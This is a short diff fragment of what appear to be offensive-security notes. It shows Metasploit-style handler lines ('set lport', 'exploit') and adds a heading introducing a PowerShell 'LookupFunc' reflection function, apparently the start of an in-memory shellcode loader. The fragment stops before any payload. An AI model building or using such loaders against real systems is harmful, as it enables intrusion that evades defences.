@@ -25,6 +25,8 @@ set lport PORT
 exploit
 ```
 
+Actual reflection code:
+
 ```powershell
 function LookupFunc {
   Param ($moduleName, $functionName)
